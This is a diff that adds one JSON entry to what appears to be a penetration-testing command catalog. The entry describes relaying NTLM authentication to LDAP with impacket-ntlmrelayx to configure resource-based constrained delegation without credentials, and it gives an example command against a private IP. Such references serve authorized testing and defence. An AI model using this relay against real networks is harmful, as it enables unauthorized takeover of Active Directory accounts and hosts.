@@ -1,0 +1,25 @@
+{
+  "id": "ntlmrelayx-ldap",
+  "name": "NTLM Relay to LDAP",
+  "command": "impacket-ntlmrelayx -t ldap://<ip> --delegate-access",
+  "description": "Relay NTLM authentication to LDAP to configure RBCD delegation",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "ldap",
+    "ntlm"
+  ],
+  "tags": [
+    "impacket",
+    "ntlmrelay",
+    "relay",
+    "ldap",
+    "rbcd",
+    "delegation"
+  ],
+  "examples": [
+    "impacket-ntlmrelayx -t ldap://192.168.1.100 --delegate-access"
+  ]
+}
